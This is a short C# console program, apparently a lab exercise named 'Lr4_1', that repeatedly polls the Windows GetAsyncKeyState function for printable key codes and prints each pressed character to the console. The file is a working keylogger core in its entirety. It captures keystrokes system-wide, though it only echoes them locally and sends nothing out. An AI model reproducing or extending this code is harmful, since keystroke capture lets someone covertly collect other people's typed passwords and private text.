using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Lr4_1
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static string keylog = "";

        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        Console.Write((char)i + ",");
                    }

                }
            }
        }
    }
}
